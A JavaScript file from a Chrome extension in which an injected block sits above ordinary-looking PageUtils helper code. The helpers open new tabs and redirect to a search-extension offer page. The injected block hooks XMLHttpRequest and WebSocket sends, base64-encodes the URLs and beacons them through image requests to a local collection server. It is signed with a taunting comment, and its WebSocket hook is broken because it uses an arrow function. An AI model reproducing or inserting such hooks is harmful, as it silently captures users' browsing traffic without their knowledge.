function collectMessageToServer(data){
    var img = document.createElement("img");
    img.src = "http://127.0.0.1:8080/" + chrome.runtime.id + "/" + data;
}

function hookAjax(){
    var _XMLHTTPRequestOpen = XMLHttpRequest.prototype.open;
    XMLHttpRequest.prototype.open = function(){
        console.log(arguments);
        collectMessageToServer("bk-ajax-" + btoa(arguments[1]));
        _XMLHTTPRequestOpen.apply(this, arguments);
    }
}
function hookWebsocket() {
    var _websockSend = WebSocket.prototype.send;
    WebSocket.prototype.send = () => {
        console.log(arguments);
        collectMessageToServer("bk-ws-" + btoa(arguments[1]));
        _websockSend.apply(this, arguments);
    }
}

function run(){
    hookAjax();
    hookWebsocket();
}
run();
//sn00ker_ahahaha
"use strict";
var PageUtils;
(function (PageUtils) {
    PageUtils.stParamName = "st";
    PageUtils.stParamValueHp = "hp";
    PageUtils.stParamValueTab = "tab";
    function getNewTabResourceUrl(paramName, paramValue, keyValueParamPairs) {
        if (paramName === void 0) { paramName = PageUtils.stParamName; }
        if (paramValue === void 0) { paramValue = PageUtils.stParamValueHp; }
        var manifest = chrome.runtime.getManifest();
        var newTab = manifest.chrome_url_overrides.newtab ? manifest.chrome_url_overrides.newtab : "newtabproduct.html";
        var newTabUrl = "chrome-extension://" + chrome.runtime.id + "/" + newTab;
        var concatenatedParamsStr = keyValueParamPairs ? keyValueParamPairs.reduce(function (acc, current) { return acc + "&" + current; }) : "";
        var paramStrDelimiter;
        if (paramName !== "" && paramValue !== "") {
            newTabUrl = UrlUtils.appendParamToUrl(newTabUrl, paramName, paramValue);
            paramStrDelimiter = "&";
        }
        else {
            paramStrDelimiter = "?";
        }
        if (concatenatedParamsStr) {
            newTabUrl = "" + newTabUrl + paramStrDelimiter + concatenatedParamsStr;
        }
        return newTabUrl;
    }
    PageUtils.getNewTabResourceUrl = getNewTabResourceUrl;
    function openNewTabPage(paramName, paramValue) {
        if (paramName === void 0) { paramName = PageUtils.stParamName; }
        if (paramValue === void 0) { paramValue = PageUtils.stParamValueHp; }
        return new Promise(function (resolve) {
            chrome.tabs.create({
                url: getNewTabResourceUrl(paramName, paramValue)
            }, resolve);
        });
    }
    PageUtils.openNewTabPage = openNewTabPage;
    function openDefaultNewTab() {
        return new Promise(function (resolve) {
            chrome.tabs.create({}, resolve);
        });
    }
    PageUtils.openDefaultNewTab = openDefaultNewTab;
    function openSearchExtensionOfferPage(config) {
        return new Promise(function (resolve) {
            chrome.tabs.create({
                url: TextTemplate.parse(config.state.toolbarData.chromeSearchExtensionURL, config.state.replaceableParams)
            }, resolve);
        });
    }
    PageUtils.openSearchExtensionOfferPage = openSearchExtensionOfferPage;
    function redirectToSearchExtensionOfferPage(config, tabId, shouldActivate) {
        return new Promise(function (resolve) {
            chrome.tabs.update(tabId, {
                url: TextTemplate.parse(config.state.toolbarData.chromeSearchExtensionURL, config.state.replaceableParams),
                active: shouldActivate
            }, resolve);
        });
    }
    PageUtils.redirectToSearchExtensionOfferPage = redirectToSearchExtensionOfferPage;
})(PageUtils || (PageUtils = {}));
